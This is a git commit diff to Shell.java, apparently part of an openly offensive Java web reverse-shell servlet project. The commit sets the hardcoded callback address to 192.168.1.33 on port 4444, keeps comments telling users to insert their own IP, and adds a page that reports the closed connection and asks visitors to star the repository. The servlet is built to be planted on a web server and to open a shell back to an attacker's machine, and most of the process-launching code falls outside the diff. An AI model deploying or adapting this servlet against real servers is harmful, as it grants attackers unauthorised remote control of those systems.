474681285628b488f79673e7e7bf5c4265ecc3d5
Julien Descannevelle <jdesca.eirl@gmail.com>
2020-07-27 12:04:16 +0000

    commit

--- src/main/java/com/manchabalais/reverse/java/Shell.java
+++ src/main/java/com/manchabalais/reverse/java/Shell.java
@@ -12,7 +12,7 @@ import javax.servlet.http.HttpServletResponse;
  */
 public class Shell extends HttpServlet {
     
-    private final String host = "10.0.0.1"; //CHANGE THIS FOR YOUR IP
+    private final String host = "192.168.1.33"; //CHANGE THIS FOR YOUR IP
     private final String port = "4444"; //CHANGE THIS IF YOU WANT TO CONNECT ON ANOTHER PORT
 
     @Override
@@ -25,6 +25,13 @@ public class Shell extends HttpServlet {
             p.waitFor();
         } catch (InterruptedException ex) {
             response.getWriter().println(ex.getMessage());
-        }
+        }response.getWriter().println("<html><body><pre>");
+        response.getWriter().println("Connection with " + host + ":" + port + " closed.");
+        response.getWriter().println();
+        response.getWriter().println("Hope you enjoyed it!");
+        response.getWriter().println("Please visit <a href='https://github.com/julien-desca/Java-Web-ReverseShell'>https://github.com/julien-desca/Java-Web-ReverseShell</a> & leave a star !");
+        response.getWriter().println();
+        response.getWriter().println("\t\t\t\t\t cheers, manchabalais.");
+        response.getWriter().println("</pre></body></html>");
     }
 }
